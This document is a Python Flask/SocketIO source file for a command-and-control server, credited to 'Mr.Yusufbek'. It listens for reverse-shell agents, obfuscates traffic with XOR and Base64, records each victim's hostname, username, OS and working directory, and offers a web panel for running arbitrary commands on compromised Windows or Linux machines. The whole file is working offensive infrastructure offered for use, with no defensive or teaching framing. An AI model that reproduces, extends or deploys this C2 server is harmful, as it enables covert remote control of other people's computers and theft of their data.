#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import socket
import threading
import time
import base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'c2-secret-key-2024'
socketio = SocketIO(app, cors_allowed_origins="*")

XOR_KEY = 0x42
agents = {}
command_history = {}

# ANSI Colors for Terminal
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
NC = "\033[0m"

# Global Config (Will be patched by quick_setup.sh)
LPORT = 4444
LPORT_WEB = 2727

def xor_crypt(data):
    return bytes([b ^ XOR_KEY for b in data])

class Agent:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = f"{addr[0]}:{addr[1]}"
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Unknown"
        self.cwd = "Unknown"
        self.status = "Active"
        self.last_seen = time.time()
        
    def send_command(self, cmd):
        try:
            # 0. Drain the socket to avoid "one step behind" issue
            self.conn.setblocking(False)
            try:
                while self.conn.recv(4096): pass
            except:
                pass
            self.conn.setblocking(True)
            self.conn.settimeout(15.0) # 15 second timeout for commands

            # 1. Encrypt and Base64 encode the command
            encrypted_bytes = xor_crypt(cmd.encode())
            b64_cmd = base64.b64encode(encrypted_bytes)
            
            # Send command with a UNIQUE delimiter to avoid issues
            self.conn.send(b64_cmd + b'\n')
            
            response = b''
            start_time = time.time()
            while True:
                try:
                    chunk = self.conn.recv(16384) # Larger buffer
                    if not chunk:
                        break
                    response += chunk
                    # Check if we have the end of a base64 line
                    if b'\n' in chunk:
                        break
                except socket.timeout:
                    break
                except BlockingIOError:
                    time.sleep(0.1)
                    continue
                
                if time.time() - start_time > 20: 
                    break
            
            if not response:
                return "Error: No response from agent (Timeout)"
            
            # Clean up response and decode
            try:
                # We expect exactly one line of Base64 from the agent
                # If there are multiple, the LAST one is usually the result
                parts = response.strip().split(b'\n')
                result_raw = parts[-1] 
                
                decoded_b64 = base64.b64decode(result_raw)
                decrypted = xor_crypt(decoded_b64)
                # FIX: Handle Windows OEM encoding (CP866 for Russian/Central Asian characters)
                try:
                    final_output = decrypted.decode('cp866')
                except:
                    final_output = decrypted.decode('utf-8', errors='replace')
            except Exception as decode_err:
                final_output = response.decode('utf-8', errors='replace') 
            
            self.last_seen = time.time()
            return final_output
        except Exception as e:
            self.status = "Disconnected"
            return f"Error: {str(e)}"
    
    def parse_sysinfo(self, data):
        try:
            # SysInfo is also Base64 encoded now
            # Format: Base64(RawString) - Note: SysInfo in C++ agent (ReverseShell) 
            # was changed to Base64Encode((unsigned char*)sysInfo.c_str()). No XOR.
            
            # However, looking at my C++ change:
            # std::string b64Info = Base64Encode((unsigned char*)sysInfo.c_str(), sysInfo.length());
            # It is JUST Base64 encoded, NOT XOR encrypted.
            
            decoded = base64.b64decode(data).decode('utf-8', errors='ignore')
            parts = decoded.split('|')
            if len(parts) >= 5:
                self.hostname = parts[1]
                self.username = parts[2]
                self.os = parts[3]
                self.cwd = parts[4]
        except Exception as e:
            print(f"SysInfo Parse Error: {e}")
            pass

def handle_agent(conn, addr):
    agent = Agent(conn, addr)
    
    try:
        # Receive system info
        data = conn.recv(4096)
        if data:
            # Strip newline if present
            if data.endswith(b'\n'): data = data[:-1]
            agent.parse_sysinfo(data)
            agents[agent.id] = agent
            command_history[agent.id] = []
            
            # Notify all clients
            broadcast_agents()
        
        # Keep connection alive
        while agent.status == "Active":
            time.sleep(1)
            
    except Exception as e:
        print(f"Agent error: {e}")
    finally:
        if agent.id in agents:
            agents[agent.id].status = "Disconnected"
            broadcast_agents()

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Use LPORT variable so setup script can patch it
    server.bind(('0.0.0.0', LPORT))
    server.listen(5)
    print(f"\n{RED}[!] C2 Listener started on 0.0.0.0:{LPORT}{NC}")
    
    while True:
        conn, addr = server.accept()
        print(f"{GREEN}[+] New Agent connection from: {addr[0]}:{addr[1]}{NC}")
        thread = threading.Thread(target=handle_agent, args=(conn, addr))
        thread.daemon = True
        thread.start()

def broadcast_agents():
    agent_list = []
    for agent_id, agent in agents.items():
        agent_list.append({
            'id': agent.id,
            'hostname': agent.hostname,
            'username': agent.username,
            'os': agent.os,
            'cwd': agent.cwd,
            'status': agent.status,
            'last_seen': int(time.time() - agent.last_seen)
        })
    socketio.emit('agent_list', agent_list)

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def handle_connect():
    broadcast_agents()

@socketio.on('execute_command')
def handle_command(data):
    agent_id = data['agent_id']
    command = data['command']
    callback_id = data.get('callback_id', '')
    
    if agent_id not in agents:
        emit('command_result', {'error': 'Agent not found', 'callback_id': callback_id})
        return
    
    agent = agents[agent_id]
    result = agent.send_command(command)
    
    # Update CWD if cd command or if path is detected
    if command.strip().startswith('cd ') or command.strip() == 'cd':
        lines = result.strip().split('\n')
        if lines:
            # The agent returns the new path on the first line for 'cd'
            pathCandidate = lines[0].strip()
            # Basic validation for Windows or Linux path
            if (len(pathCandidate) > 2 and pathCandidate[1:3] == ':\\') or pathCandidate.startswith('/') or pathCandidate.startswith('\\\\'):
                agent.cwd = pathCandidate
                broadcast_agents()
    
    # Optional: Automatically refresh system info on certain commands
    if command.strip() in ['whoami', 'sysinfo']:
         # The result might contain info we can parse
         pass
    
    # Store in history
    command_history[agent_id].append({
        'command': command,
        'result': result,
        'timestamp': time.time()
    })
    
    emit('command_result', {
        'agent_id': agent_id,
        'command': command,
        'result': result,
        'callback_id': callback_id
    })

if __name__ == "__main__":
    import threading
    print("\n\033[96m[+] By Mr.Yusufbek\033[0m\n")
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()
    print(f"[*] Web Interface: http://0.0.0.0:{LPORT_WEB}")
    socketio.run(app, host="0.0.0.0", port=LPORT_WEB, debug=False, allow_unsafe_werkzeug=True)
